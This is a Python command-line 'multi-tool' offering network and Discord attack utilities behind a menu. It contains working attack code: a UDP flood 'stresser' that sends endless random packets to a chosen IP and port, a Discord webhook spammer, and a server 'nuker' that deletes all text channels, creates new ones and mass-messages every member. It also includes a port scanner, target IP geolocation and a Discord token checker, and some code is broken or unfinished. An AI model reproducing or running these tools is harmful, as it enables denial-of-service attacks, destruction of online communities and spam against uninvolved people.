import os
import socket
import concurrent.futures
import time
import sys
import random
import urllib3
import discord
import requests
import json
import asyncio
import threading
import subprocess
import colorama
import base64
import ssl
import datetime
import string
from colorama import Fore
colorama.init()
from datetime import datetime, timezone
from urllib.parse import urlparse
from requests.exceptions import RequestException
from bs4 import BeautifulSoup

os_name = os.name
tool_path = os.path.dirname(os.path.abspath(__file__)).split("Program\\")[0].split("Program/")[0].strip()

color = colorama.Fore
red = color.RED
white = color.WHITE
green = color.GREEN
reset = color.RESET
blue = color.BLUE
yellow = color.YELLOW


BEFORE = f'{red}[{white}'
AFTER = f'{red}]'

BEFORE_GREEN = f'{green}[{white}'
AFTER_GREEN = f'{green}]'

INPUT = f'{BEFORE}>{AFTER} |'
INFO = f'{BEFORE}!{AFTER} |'
ERROR = f'{BEFORE}x{AFTER} |'
ADD = f'{BEFORE}+{AFTER} |'
WAIT = f'{BEFORE}~{AFTER} |'
NOTE = f'{BEFORE}NOTE{AFTER} |'

GEN_VALID = f'{BEFORE_GREEN}+{AFTER_GREEN} |'
GEN_INVALID = f'{BEFORE}x{AFTER} |'

INFO_ADD = f'{white}[{red}+{white}]{red}'


os.system("cls")

def menu():
    print("""

                          /$$$$$$        /$$                    
                         /$$__  $$      | $$                    
                        | $$  \ $$  /$$$$$$$  /$$$$$$  /$$   /$$
                        | $$$$$$$$ /$$__  $$ |____  $$|  $$ /$$/
                        | $$__  $$| $$  | $$  /$$$$$$$ \  $$$$/ 
                        | $$  | $$| $$  | $$ /$$__  $$  >$$  $$ 
                        | $$  | $$|  $$$$$$$|  $$$$$$$ /$$/\  $$
                        |__/  |__/ \_______/ \_______/|__/  \__/     ______________
                                                                    |--Made by Adax|""")
    print("                                [0] Exit the Program                |______________| ")
    print("")
    print("")
    print("")
    print("")



    print("                      IP Tools,                        Discord Tools")
    print("\n                  ======================Main Menu===================")
    print("""                        [1]                               [5]
                      WhatsMyIP                     WebHook Spammer""")

    print("                   ================                =================")

    print("""                        [2]                               [6] 
                    Website Checker                  Discord Nuker""")

    print("                  =================                =================")
    
    print("""                        [3]                               [7]
                    IP Lookup                      Token BruteForce""")
    print("                  =================                =================")
    print("                  ==-IP Stresser-==                       [8]")
    print("                  =================                Token Information")

    print("""                        [4]
                      Stresser""")
    print("                  =================")
          
    print("")
    print("")
    

def Error(e):
    print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Error: {white}{e}", reset)
    Continue()
    Reset()

def ErrorChoice():
    print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Invalid Choice !", reset)
    time.sleep(3)
    Reset()

def ErrorToken():
    print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Invalid Token !", reset)
    time.sleep(3)
    Reset()

def current_time_day_hour():
    return datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')

def current_time_hour():
    return datetime.datetime.now().strftime('%H:%M:%S')

def Censored(text, website):
    
    censored = [ website]
    for censored_text in censored:
        if text in censored:
            print(f'{BEFORE + current_time_hour() + AFTER} {ERROR} Unable to find "{white}{text}{red}".')
            Continue()
            Reset()
        elif censored_text in text:
            print(f'{BEFORE + current_time_hour() + AFTER} {ERROR} Unable to find "{white}{text}{red}".')
            Continue()
            Reset()
        else:
            pass

def ChoiceUserAgent():
    file_user_agent = os.path.join(tool_path, "Input-1", "Headers", "UserAgent.txt")

    with open(file_user_agent, "r", encoding="utf-8") as file:
        lines = file.readlines()

    if lines:
        user_agent = random.choice(lines).strip()
    else:
        user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36"
    
    return user_agent

def Choice1TokenDiscord():
    def CheckToken(token_number, token):
        response = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': token, 'Content-Type': 'application/json'})
        
        if response.status_code == 200:
            user = requests.get(
                'https://discord.com/api/v8/users/@me', headers={'Authorization': token}).json()
            username_discord = user['username']
            token_sensur = token[:-25] + '.' * 3
            print(f"token_number -> Status: Valid | User: username_discord | Token: ")
        else:
            print(f" token_number -> Status: Invalid | Token: ")

    file_token_discord_relative = "\\Input-1\\TokenDisc\\TokenDisc.txt"
    file_token_discord = os.path.join(tool_path, "Input-1", "TokenDisc", "TokenDisc.txt")

    tokens = {}
    token_discord_number = 0

    with open(file_token_discord, 'r') as file_token:
        print(f"Token Discord ({white}{file_token_discord_relative}{red}):\n")
        for line in file_token:
            if not line.strip() or line.isspace():
                continue
    
            token_discord_number += 1
            modified_token = line.strip()
            tokens[token_discord_number] = modified_token
            CheckToken(token_discord_number, modified_token)

    if not tokens:
        print(f"{BEFORE + current_time_hour() + AFTER} {INFO} No Token Discord in file: {white}{file_token_discord_relative}{red} Please add tokens to the file.")
        Continue()
        Reset()
        return None

    try:
        selected_token_number = int(input(f"\n Token Number -> {reset}"))
    except:
        ErrorChoice()

    selected_token = tokens.get(selected_token_number)
    if selected_token:
        r = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': selected_token, 'Content-Type': 'application/json'})
        if r.status_code == 200:
            pass
        else:
            ErrorToken()
    else:
        ErrorChoice()
    return selected_token



def CheckWebhook(webhook):
    try:
        response = requests.get(webhook)
        if response.status_code == 200 or response.status_code == "200":
            return True
        else:
            return False
    except:
        return None
    

def Reset():
    if os_name == "Windows":
        file = ['python', os.path.join(tool_path, "RedTiger.py")]
        subprocess.run(file)
    
def ErrorNumber():
    print(f"Invalid Number !" )
    time.sleep(3)
    Reset()

def Slow(text):
    delai = 0.03
    lignes = text.split('\n')
    for ligne in lignes:
        print(ligne)
        time.sleep(delai)


def Continue():
    input(f" Press to continue ->  " )

def MainColor2(text):
    start_color = (168, 5, 5)  
    end_color = (255, 118, 118)

    num_steps = 9

    colors = []
    for i in range(num_steps):
        r = start_color[0] + (end_color[0] - start_color[0]) * i // (num_steps - 1)
        g = start_color[1] + (end_color[1] - start_color[1]) * i // (num_steps - 1)
        b = start_color[2] + (end_color[2] - start_color[2]) * i // (num_steps - 1)
        colors.append((r, g, b))
    
    colors += list(reversed(colors[:-1]))



os.system("color 4")









def option1():
     logo = """
     
 ██▓ ███▄    █   █████▒▒█████   ██▀███   ███▄ ▄███▓ ▄▄▄     ▄▄▄█████▓ ██▓ ▒█████   ███▄    █ 
▓██▒ ██ ▀█   █ ▓██   ▒▒██▒  ██▒▓██ ▒ ██▒▓██▒▀█▀ ██▒▒████▄   ▓  ██▒ ▓▒▓██▒▒██▒  ██▒ ██ ▀█   █ 
▒██▒▓██  ▀█ ██▒▒████ ░▒██░  ██▒▓██ ░▄█ ▒▓██    ▓██░▒██  ▀█▄ ▒ ▓██░ ▒░▒██▒▒██░  ██▒▓██  ▀█ ██▒
░██░▓██▒  ▐▌██▒░▓█▒  ░▒██   ██░▒██▀▀█▄  ▒██    ▒██ ░██▄▄▄▄██░ ▓██▓ ░ ░██░▒██   ██░▓██▒  ▐▌██▒
░██░▒██░   ▓██░░▒█░   ░ ████▓▒░░██▓ ▒██▒▒██▒   ░██▒ ▓█   ▓██▒ ▒██▒ ░ ░██░░ ████▓▒░▒██░   ▓██░
░▓  ░ ▒░   ▒ ▒  ▒ ░   ░ ▒░▒░▒░ ░ ▒▓ ░▒▓░░ ▒░   ░  ░ ▒▒   ▓▒█░ ▒ ░░   ░▓  ░ ▒░▒░▒░ ░ ▒░   ▒ ▒ 
 ▒ ░░ ░░   ░ ▒░ ░       ░ ▒ ▒░   ░▒ ░ ▒░░  ░      ░  ▒   ▒▒ ░   ░     ▒ ░  ░ ▒ ▒░ ░ ░░   ░ ▒░
 ▒ ░   ░   ░ ░  ░ ░   ░ ░ ░ ▒    ░░   ░ ░      ░     ░   ▒    ░       ▒ ░░ ░ ░ ▒     ░   ░ ░ 
 ░           ░            ░ ░     ░            ░         ░  ░         ░      ░ ░           ░ 
                                                                                             
    """
     print(logo)

     os.system("cls")

     print(logo)

     r = requests.get("http://ip-api.com/json")
     data = r.json()
     print("")
     print("")
     input("Press Enter to continue...")
     os.system("cls")
     print(logo)
     print("")
     print("")
     print("")

     print(f"Status: {data["status"]}")
     print(f"Country: {data["country"]}")
     print(f"Region: {data["regionName"]}")
     print(f"City: {data["city"]}")
     print(f"PostCode: {data["zip"]}")
     print(f"ISP: {data["isp"]}")
     print("")
     print("")
     print("===*Thats your final IP*===")
     print("            |")
     print("            |")
     print("            ↓")
     print(f"   ==={data["query"]}===")
     print("")
     print("")
     print("")
     input("Press Enter To continue... ")

map_banner = (r"""
                                      :**+ :::+*@@.                                                         
                              +: @ = =.  :#@@@@@@@@                 :     .=*@@#     -                      
                 @@@@-. :=: +@@.:% *=@@:   @@@@@@          :#=::     .:@=@@@@@@@@@@@@@@@@@@@@--.-:          
             .#@@@@@@@@@@@@@@@@@@:# .@@   #@@    :@-     +@@:@@@+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@*        
             #*   :%@@@@@@@@@@:   .@@#*              ..  ##@ *#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@-:- %=         
                   *@@@@@@@@@@@@%@@@@@@@            = @=+@@@@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@+   #.        
                   #@@@@@@@@@##@@@@@= =#              #@@@#@@@@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@=            
                  @@@@@@@@@@@#+#@@=                 :@@@-.#-*#@.  .@@.=%@@@@%@@@@@@@@@@@@@@@@@=  +          
                 :@@@@@@@@@@@@@@:                   :@@    # - @@@@@@@ =@@@*#*@@@@@@@@@@@@@=.=-  #:         
                  :@@@@@@@@@@@+                     @@@@@@@: :    @@@@@@@@@@@@@@@@@@@@@@@@@@@               
                   #@@@@@    @                     #%@@@@@@@@@@@@@@@@@:@@@@@@@@@@@@#@@@@@@@@@:              
                     @@@     .                    @@@@@@@@@@@@@@@@-%@@@%@#   @@@@@@#=@#@@@@@==              
                     =@@##@   =:*.                @@@@@@*@@@@@@@@@@-=@@@@.    +@@@:  %#@@#=   :             
                         .=@.                     #@@@@@@@@#@@@@@@@@+#:        %@      *%@=                 
                            . @@@@@@               @#@@*@@@@@@@@@@@@@@@=        :-     -       =.           
                             :@@@@@@@#=                   @@@@@@@@@@@@-               :+%  .@=              
                            -@@@@@@@@@@@@                 @+@@@@*+@@#                   @. @@.#   # :       
                             @@@@@@@@@@@@@@@               @@@@@*@@@                     :=.        @@@.    
                              @@@@@@@@@@@@@                #@@@@@@%@.                             :  :      
                               *@@@@@@@@@@%               :@@@@@@@@@ @@.                      .@@@@=:@      
                                :@@@@@@@@@                 #@@@@@@   @:                    .#@@@@@@@@@@     
                                :@@@@%@@                   .@@@@@-   .                     @@@@@@@@@@@@*    
                                :@@@@@@.                    *@@@-                          @@@@#@@@@@@@     
                                .@@@@@                                                           =@@@:    @=
                                 =@@                                                              =    #+   
                                  @%                                                                        
""")

def website_scanner_menu():
    try:
        os.system("cls")
        Slow(map_banner)
        user_agent = ChoiceUserAgent()
        headers = {"User-Agent": user_agent}

        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

        def WebsiteFoundUrl(url):
            website_url = f"https://{url}" if not urlparse(url).scheme else url
            print(f"{BEFORE + AFTER} {ADD} Website: {white}{website_url}{red}")
            return website_url

        def WebsiteDomain(website_url):
            domain = urlparse(website_url).netloc
            print(f"{BEFORE + AFTER} {ADD} Domain: {white}{domain}{red}")
            return domain

        def WebsiteIp(domain):
            try:
                ip = socket.gethostbyname(domain)
            except socket.gaierror:
                ip = "None"
            if ip != "None":
                print(f"{BEFORE + AFTER} {ADD} IP: {white}{ip}{red}")
            return ip

        def IpType(ip):
            if ':' in ip:
                type = "ipv6" 
            elif '.' in ip:
                type = "ipv4"
            else:
                return
            print(f"{BEFORE + AFTER} {ADD} IP Type: {white}{type}{red}")

        def WebsiteSecure(website_url):
            print(f"{BEFORE + AFTER} {ADD} Secure: {white}{website_url.startswith('https://')}{red}")

        def WebsiteStatus(website_url):
            try:
                status_code = requests.get(website_url, timeout=5, headers=headers).status_code
            except RequestException:
                status_code = 404
            print(f"{BEFORE + AFTER} {ADD} Status Code: {white}{status_code}{red}")

        def IpInfo(ip):
            try:
                api = requests.get(f"https://ipinfo.io/{ip}/json", headers=headers).json()
            except RequestException:
                api = {}
            for key in ['country', 'hostname', 'isp', 'org', 'asn']:
                if key in api:
                    print(f"{BEFORE + AFTER} {ADD} Host {key.capitalize()}: {white}{api[key]}{red}")

        def IpDns(ip):
            try:
                dns = socket.gethostbyaddr(ip)[0]
            except:
                dns = "None"
            if dns != "None":
                print(f"{BEFORE + AFTER} {ADD} Host DNS: {white}{dns}{red}")

        def WebsitePort(ip):
            ports = [21, 22, 23, 25, 53, 69, 80, 110, 123, 143, 194, 389, 443, 161, 3306, 5432, 6379, 1521, 3389]
            port_protocol_map = {
                21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS", 69: "TFTP",
                80: "HTTP", 110: "POP3", 123: "NTP", 143: "IMAP", 194: "IRC", 389: "LDAP",
                443: "HTTPS", 161: "SNMP", 3306: "MySQL", 5432: "PostgreSQL", 6379: "Redis",
                1521: "Oracle DB", 3389: "RDP"
            }

            def ScanPort(ip, port):
                try:
                    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                        sock.settimeout(1)
                        if sock.connect_ex((ip, port)) == 0:
                            print(f"{BEFORE + AFTER} {ADD} Port: {white}{port}{red} Status: {white}Open{red} Protocol: {white}{port_protocol_map.get(port, 'Unknown')}{red}")
                except:
                    pass

            with concurrent.futures.ThreadPoolExecutor() as executor:
                executor.map(lambda p: ScanPort(ip, p), ports)

        def HttpHeaders(website_url):
            try:
                headers = requests.get(website_url, timeout=5).headers
                for header, value in headers.items():
                    print(f"{BEFORE + AFTER} {ADD} HTTP Header: {white}{header}{red} Value: {white}{value}{red}")
            except RequestException:
                pass

        def CheckSslCertificate(website_url):
            try:
                with ssl.create_default_context().wrap_socket(socket.socket(), server_hostname=urlparse(website_url).hostname) as sock:
                    sock.settimeout(5)
                    sock.connect((urlparse(website_url).hostname, 443))
                    cert = sock.getpeercert()
                for key, value in cert.items():
                    print(f"{BEFORE + AFTER} {ADD} SSL Certificate Key: {white}{key}{red} Value: {white}{value}{red}")
            except:
                pass

        def CheckSecurityHeaders(website_url):
            headers = ['Content-Security-Policy', 'Strict-Transport-Security', 'X-Content-Type-Options', 'X-Frame-Options', 'X-XSS-Protection']
            try:
                response_headers = requests.get(website_url, timeout=5).headers
                for header in headers:
                    print(f"{BEFORE + AFTER} {ADD} {'Missing' if header not in response_headers else 'Security'} Header: {white}{header}{red}")
            except RequestException:
                pass

        def AnalyzeCookies(website_url):
            try:
                cookies = requests.get(website_url, timeout=5, headers=headers).cookies
                for cookie in cookies:
                    secure = 'Secure' if cookie.secure else 'Not Secure'
                    httponly = 'HttpOnly' if cookie.has_nonstandard_attr('HttpOnly') else 'Not HttpOnly'
                    print(f"{BEFORE + AFTER} {ADD} Cookie: {white}{cookie.name}{red} Secure: {white}{secure}{red} HttpOnly: {white}{httponly}{red}")
            except RequestException:
                pass

        def DetectTechnologies(website_url):
            try:
                response = requests.get(website_url, timeout=5, headers=headers)
                headers = response.headers
                soup = BeautifulSoup(response.content, 'html.parser')
                techs = []
                if 'x-powered-by' in headers:
                    techs.append(f"X-Powered-By: {headers['x-powered-by']}")
                if 'server' in headers:
                    techs.append(f"Server: {headers['server']}")
                for script in soup.find_all('script', src=True):
                    if 'jquery' in script['src']:
                        techs.append("jQuery")
                    if 'bootstrap' in script['src']:
                        techs.append("Bootstrap")
                for tech in techs:
                    print(f"{BEFORE + AFTER} {ADD} Detected Technology: {white}{tech}{red}")
            except:
                pass


        print(f"{BEFORE + AFTER} {INFO} Selected User-Agent: {white + user_agent}")
        url = input(f"{BEFORE + AFTER} {INPUT} Website URL -> {reset}")
        print(f"{BEFORE + AFTER} {WAIT} Scanning..{reset}")

        website_url = WebsiteFoundUrl(url)
        domain = WebsiteDomain(website_url)
        ip = WebsiteIp(domain)
        IpType(ip)
        WebsiteSecure(website_url)
        WebsiteStatus(website_url)
        IpInfo(ip)
        IpDns(ip)
        WebsitePort(ip)
        HttpHeaders(website_url)
        CheckSslCertificate(website_url)
        CheckSecurityHeaders(website_url)
        AnalyzeCookies(website_url)
        DetectTechnologies(website_url)
        Continue()
        Reset()

    except Exception as e:
        Error(e)



def IP_Lookup():

 os.system("cls")
 os.system("color 4")

 logo= """
    " ██▓ ██▓███      ██▓     ▒█████   ▒█████   ██ ▄█▀ █    ██  ██▓███  ",
    "▓██▒▓██░  ██▒   ▓██▒    ▒██▒  ██▒▒██▒  ██▒ ██▄█▒  ██  ▓██▒▓██░  ██▒",
    "▒██▒▓██░ ██▓▒   ▒██░    ▒██░  ██▒▒██░  ██▒▓███▄░ ▓██  ▒██░▓██░ ██▓▒",
    "░██░▒██▄█▓▒ ▒   ▒██░    ▒██   ██░▒██   ██░▓██ █▄ ▓▓█  ░██░▒██▄█▓▒ ▒",
    "░██░▒██▒ ░  ░   ░██████▒░ ████▓▒░░ ████▓▒░▒██▒ █▄▒▒█████▓ ▒██▒ ░  ░",
    "░▓  ▒▓▒░ ░  ░   ░ ▒░▓  ░░ ▒░▒░▒░ ░ ▒░▒░▒░ ▒ ▒▒ ▓▒░▒▓▒ ▒ ▒ ▒▓▒░ ░  ░",
    " ▒ ░░▒ ░        ░ ░ ▒  ░  ░ ▒ ▒░   ░ ▒ ▒░ ░ ░▒ ▒░░░▒░ ░ ░ ░▒ ░     ",
    " ▒ ░░░            ░ ░   ░ ░ ░ ▒  ░ ░ ░ ▒  ░ ░░ ░  ░░░ ░ ░ ░░       ",
    " ░                  ░  ░    ░ ░      ░ ░  ░  ░      ░              ",
 """


 n = len(logo)
 print(logo)

 print("")
 os.system("title IP Lookup - by Adax")

 x = input("Press Enter to Start")
 if x=="":
        os.system("cls")
        print(logo)
        IP = input("ENTER TARGET IP: ")


        r = requests.get(f"http://ip-api.com/json/{IP}")
        data = r.json()
        print("")
        print("RESULTS\n")
        print("")


        print(f"Country: {data["country"]}")
        print(f"Region: {data["regionName"]}")
        print(f"City: {data["city"]}")
        print(f"zip: {data["zip"]}")
        print(f"ISP: {data["isp"]}")
        print(f"TimeZone: {data["timezone"]}")
        print(f"IP: {data["query"]}")

        print("")
        pause = input("Press Enter To Proceed..")




def option4():
 logo = """

  ██████ ▄▄▄█████▓ ██▀███  ▓█████   ██████   ██████ ▓█████  ██▀███  
▒██    ▒ ▓  ██▒ ▓▒▓██ ▒ ██▒▓█   ▀ ▒██    ▒ ▒██    ▒ ▓█   ▀ ▓██ ▒ ██▒
░ ▓██▄   ▒ ▓██░ ▒░▓██ ░▄█ ▒▒███   ░ ▓██▄   ░ ▓██▄   ▒███   ▓██ ░▄█ ▒
  ▒   ██▒░ ▓██▓ ░ ▒██▀▀█▄  ▒▓█  ▄   ▒   ██▒  ▒   ██▒▒▓█  ▄ ▒██▀▀█▄  
▒██████▒▒  ▒██▒ ░ ░██▓ ▒██▒░▒████▒▒██████▒▒▒██████▒▒░▒████▒░██▓ ▒██▒
▒ ▒▓▒ ▒ ░  ▒ ░░   ░ ▒▓ ░▒▓░░░ ▒░ ░▒ ▒▓▒ ▒ ░▒ ▒▓▒ ▒ ░░░ ▒░ ░░ ▒▓ ░▒▓░
░ ░▒  ░ ░    ░      ░▒ ░ ▒░ ░ ░  ░░ ░▒  ░ ░░ ░▒  ░ ░ ░ ░  ░  ░▒ ░ ▒░
░  ░  ░    ░        ░░   ░    ░   ░  ░  ░  ░  ░  ░     ░     ░░   ░ 
      ░              ░        ░  ░      ░        ░     ░  ░   ░     
                                                                    """

 os.system("cls")

 print(logo)

 connect = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 print("!WARNING USE AT UR OWN RISK THIS IS CODE SENDING PACKETS FROM UR COMPUTER IT WILL LAG U! ")
 try:
    ip = input("IP> ")
    port = int(input("port> "))
    size = int(input("Size> "))
    attack = random._urandom(size)
    print(" ")
    print("Launching Attack")
    print(" ")
 except SyntaxError:
    print(" ")
    exit("\033[1;34m ERROR \033[1;m")
 except NameError:
    print(" ")
    exit("\033[1;34m Invalid Input \033[1;m")
 except KeyboardInterrupt:
    print(" ")
    exit("\033[1;34m [-]Canceled By User \033[1;m")
 except ImportError:
    print(" ")
    exit("\033[1;34m [-]Install python 2.7.15")

 while True:
    try:
        connect.sendto(attack, (ip, port))
        print(" Heavy Attack sending  ===>")
    except KeyboardInterrupt:
        print(" ")
        exit("\033[1;34m [-]Canceled By User \033[1;m")
    except ImportError:
        print(" ")
        exit("\033[1;34m [-]Install python 2.7.15")



discord_banner = (r"""
                                              @@@@                @%@@                                      
                                       @@@@@@@@@@@@               @@@@@@@@@@%                               
                                  @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                          
                                 @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%                         
                                %@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                        
                               @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                       
                              @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                      
                             @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                     
                            @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%                    
                           @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                   
                          %@@@@@@@@@@@@@@@@@@    @@@@@@@@@@@@@@@@@@    @@@@@@@@@@@@@@@@@@%                  
                          %@@@@@@@@@@@@@@@@        %@@@@@@@@@@@%@        @@@@@@@@@@@@@@@@@                  
                          %@@@@@@@@@@@@@@@          @@@@@@@@@@@@          @@@@@@@@@@@@@@@%                  
                         %@@@@@@@@@@@@@@@@          @@@@@@@@@@@%          %@@@@@@@@@@@@@@@@                 
                         @@@@@@@@@@@@@@@@@%         @@@@@@@@@@@%         %@@@@@@@@@@@@@@@@@                 
                         @@@@@@@@@@@@@@@@@@@      %@@@@@@@@@@@@@@@      @@@@@@@@@@@@@@@@@@%                 
                         %@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%                 
                         @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%                 
                         @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                 
                         @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%                 
                           @%@@@@@@@@@@@@@%@@   @@@@%@@@@@@@@@%%%@%@@  @@@@@@@@@@@@@@@@@@                   
                              @@%@@@@@@@@@@@@@                        @%@@@@@@@@@@@%@@                      
                                   @%@@@@@@@                            @@@@@@%%@                           
                                         @@                              @@                           
 """)


def WebhookSpam():
 



    try:
        Slow(discord_banner)
    except ValueError:
        print("Failed!")
        os.system("cls")
    print("")
    print("")
    print("                                      ==========Discord WebHook Spammer==========")
    print("")
    print("")
    print("")


  
    webhook = input("Webhook URL -> ")
    spamtime = float(input(f"How long -> "))
    word = "" # Put in here The Text that will spammed in the chat

    print("────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────")
    print(f"Webhook gets spammed...")

    start = time.time()
    end_time = start + spamtime

    webhook_url = webhook
    message = {
        "content": word
    }
  
    while True:
        response = requests.post(webhook_url, json=message)

        if time.time() >= end_time:
         print(f"Spammed webhook for {spamtime} seconds")
         print("────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────")
         break
   


def starte_nuke():
    os.system("cls")
    try:
        Slow(discord_banner)
    except ValueError:
        print("Failed!")
    print("                                      =========Discord Server Nuker=========")
    print("")
    print("")
    print("")
    TOKEN = input("Your BOT Token: ")
    GUILD_ID = int(input("Your Guild ID: "))
    DM_TEXT = input("Enter the massage wich will be send to the members: ")
    SENT_USERS_FILE = "sent_users.txt"
    DELAY_BETWEEN_MESSAGES = 0.2

    intents = discord.Intents.default()
    intents.members = True
    intents.guilds = True

    client = discord.Client(intents=intents)


    async def delete_all_text_channels(guild: discord.Guild):
     """Löscht alle Text-Channels in der Guild."""
     text_channels = guild.text_channels
     if not text_channels:
        print("Keine Textchannels gefunden.")
        return

     print(f"Es werden {len(text_channels)} Textchannels gelöscht...")
     for ch in text_channels:
        try:
            await ch.delete(reason="Alle Channels gelöscht per Bot")
            print(f"Gelöscht: {ch.name} ({ch.id})")
        except discord.Forbidden:
            print(f"Fehler: Keine Berechtigung zum Löschen von {ch.name}")
        except discord.HTTPException as e:
            print(f"HTTP-Fehler beim Löschen von {ch.name}: {e}")
        

    def load_sent_user_ids():
     if not os.path.exists(SENT_USERS_FILE):
        return set()
     with open(SENT_USERS_FILE, "r") as f:
        return set(int(line.strip()) for line in f if line.strip().isdigit())

    @client.event
    async def on_ready():
     print(f"Eingeloggt als {client.user} (ID: {client.user.id})")
     guild = client.get_guild(GUILD_ID)
     if guild is None:
        print("Failed to Nuke Discord Channel")
        await client.close()
        return
    
     await delete_all_text_channels(guild)
    

     for i in range(30):# how many chanels will be created
        channel_name = f"" # name of channels that will be created
        try:
            new_channel = await guild.create_text_channel(channel_name)
            print(f"Erstellt: {new_channel.name} ({new_channel.id})")
        except discord.Forbidden:
            print("Fehler: Fehlende Berechtigungen (Manage Channels).")
            break
        except discord.HTTPException as e:
            print(f"HTTP-Error beim Erstellen des Channels: {e}")
            break
    
        await asyncio.sleep(0.01)# Chill Time between channels getting created (in seconds)

    
    
     print(f"Load Memberlist '{guild.name}'...")
     await guild.chunk()

     sent_user_ids = load_sent_user_ids()
     print(f"Already loaded User: {len(sent_user_ids)}")

     count_sent = 0
     count_failed = 0

     for member in guild.members:
        if member.bot:
            continue
        if member.id in sent_user_ids:
            continue

        try:
            await member.send(DM_TEXT)
            print(f"✅ DM send to: {member.name}#{member.discriminator}")
            count_sent += 1
        except discord.Forbidden:
            print(f"❌Send DM failed: {member.name}#{member.discriminator} (probably disabled)")
            count_failed += 1
        except Exception as e:
            print(f"❌ Error by {member.name}: {e}")
            count_failed += 1

        await asyncio.sleep(DELAY_BETWEEN_MESSAGES)

     print(f"\n📬 DMs sendes: {count_sent}, failed: {count_failed}")
     await client.close()

    asyncio.run(client.start(TOKEN))

    input("Press Enter to go back...")







def bruhmoment():
    os.system("cls")

    color_webhook = 0xa80505
    username_webhook = menu
    avatar_webhook = 'https://media.discordapp.net/attachments/1369051349106430004/1369054652213231687/RedTiger-Logo-1-Large.png?ex=6821b740&is=682065c0&hm=fb74ee5ac9239dd15605a36bfde4da265ee788fe83b1938b0fc3b1dd6ffa8871&=&format=webp&quality=lossless&width=1032&height=1032'

    print(F"{Fore.RED}█████▄  ██▓  ██████  ▄████▄   ▒█████   ██▀███  ▓█████▄    ▄▄▄█████▓ ▒█████   ██ ▄█▀▓█████  ███▄    █     ▄▄▄▄     █████▒")
    print(F"{Fore.RED}▒██▀ ██▌▓██▒▒██    ▒ ▒██▀ ▀█  ▒██▒  ██▒▓██ ▒ ██▒▒██▀ ██▌   ▓  ██▒ ▓▒▒██▒  ██▒ ██▄█▒ ▓█   ▀  ██ ▀█   █    ▓█████▄ ▓██   ▒ ")
    time.sleep(0.1)
    print(F"{Fore.RED}░██   █▌▒██▒░ ▓██▄   ▒▓█    ▄ ▒██░  ██▒▓██ ░▄█ ▒░██   █▌   ▒ ▓██░ ▒░▒██░  ██▒▓███▄░ ▒███   ▓██  ▀█ ██▒   ▒██▒ ▄██▒████ ░ ")
    time.sleep(0.1)
    print(F"{Fore.RED}░▓█▄   ▌░██░  ▒   ██▒▒▓▓▄ ▄██▒▒██   ██░▒██▀▀█▄  ░▓█▄   ▌   ░ ▓██▓ ░ ▒██   ██░▓██ █▄ ▒▓█  ▄ ▓██▒  ▐▌██▒   ▒██░█▀  ░▓█▒  ░ ")
    time.sleep(0.1)
    print(F"{Fore.RED}░▒████▓ ░██░▒██████▒▒▒ ▓███▀ ░░ ████▓▒░░██▓ ▒██▒░▒████▓      ▒██▒ ░ ░ ████▓▒░▒██▒ █▄░▒████▒▒██░   ▓██░   ░▓█  ▀█▓░▒█░    ")
    time.sleep(0.1)
    print(F"{Fore.RED}▒▒▓  ▒ ░▓  ▒ ▒▓▒ ▒ ░░ ░▒ ▒  ░░ ▒░▒░▒░ ░ ▒▓ ░▒▓░ ▒▒▓  ▒      ▒ ░░   ░ ▒░▒░▒░ ▒ ▒▒ ▓▒░░ ▒░ ░░ ▒░   ▒ ▒    ░▒▓███▀▒ ▒ ░ ")
    time.sleep(0.1)
    print(F"{Fore.RED}░ ▒  ▒  ▒ ░░ ░▒  ░ ░  ░  ▒     ░ ▒ ▒░   ░▒ ░ ▒░ ░ ▒  ▒        ░      ░ ▒ ▒░ ░ ░▒ ▒░ ░ ░  ░░ ░░   ░ ▒░   ▒░▒   ░  ░ ")
    time.sleep(0.1)     
    print(F"{Fore.RED}░ ░  ░  ▒ ░░  ░  ░  ░        ░ ░ ░ ▒    ░░   ░  ░ ░  ░      ░      ░ ░ ░ ▒  ░ ░░ ░    ░      ░   ░ ░     ░    ░  ░ ░    ")
    time.sleep(0.1)
    print(F"{Fore.RED}   ░     ░        ░  ░ ░          ░ ░     ░        ░                    ░ ░  ░  ░      ░  ░         ░     ░         ")
    time.sleep(0.1)     
